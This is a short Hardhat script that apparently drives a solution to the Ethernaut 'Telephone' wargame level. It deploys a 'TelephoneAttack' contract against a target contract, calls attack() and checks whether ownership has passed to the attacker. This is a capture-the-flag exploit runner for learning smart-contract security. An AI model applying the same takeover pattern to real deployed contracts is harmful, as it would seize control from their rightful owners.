const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x968cB05aE8cDE14332b87792f85d7546C665E908"
    let target = await ethers.getContractAt("Telephone", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "TelephoneAttack"
    )
    let attackerContract = await attackerContractFactory.deploy(target.address)
    // Re-use deployed contract
    // let attackerContract = await ethers.getContractAt(
    //     "CoinAttack",
    //     ""
    // )

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker contract deployed at : ${attackerContract.address}`)

    // Attack
    tx = await attackerContract.attack()
    await tx.wait(1)

    // Check
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Owned Contract`)
    } else {
        console.log(`${symbols.error} Contract owner is ${owner}!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
